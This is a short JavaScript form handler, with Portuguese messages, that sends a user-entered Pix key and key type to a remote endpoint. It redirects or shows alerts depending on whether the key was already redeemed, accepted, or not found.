document.getElementById('formPix').addEventListener('submit', function(event) {
    event.preventDefault(); 

    let button = document.getElementById('submit');
    button.disabled = true;
    
    let tipoChave = document.querySelector('input[name="tipoChave"]:checked');
    let tipoChaveValue = tipoChave ? tipoChave.value : '';

    
    let chavePix = document.getElementById('chavePix').value;

    
    let data = {
        key: chavePix,
        typeKey: tipoChaveValue
    };


fetch('https://pix2-6v3z2gpui-daanrox.vercel.app/create', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json'
    },
    body: JSON.stringify(data)
})
.then(response => {
    if (response.status === 403) {
        return response.json().then(result => {
            if (result.message === "Chave pix já resgatada") {
                window.location.href = 'api2.html';
            } 
            console.log(result)
        });
    } else if (response.status === 201) {
        return response.json().then(result => {
            if (result.response === "OK") {
                window.location.href = 'sucessod41d.html';
            } 
            console.log(result)
        });
    } else if (response.status === 404 || response.status === 400) {
        return response.json().then(result => {
            if (result.response === "PIX_KEY_NOT_FOUND") {
               alert("Chave Pix Não Encontrada!")
            }
            console.log(result)
        });
    } else if (response.status === 403 || response.message === "Access Denied") {
        return response.json().then(result => {
            if (result.message === "Access Denied") {
               alert("Acesso Negado")
            }
            console.log(result)
        });
    } else {
        console.log('Status desconhecido:', response.status);
    }
})
.catch(error => {
    console.error('Erro:', error);
});
});
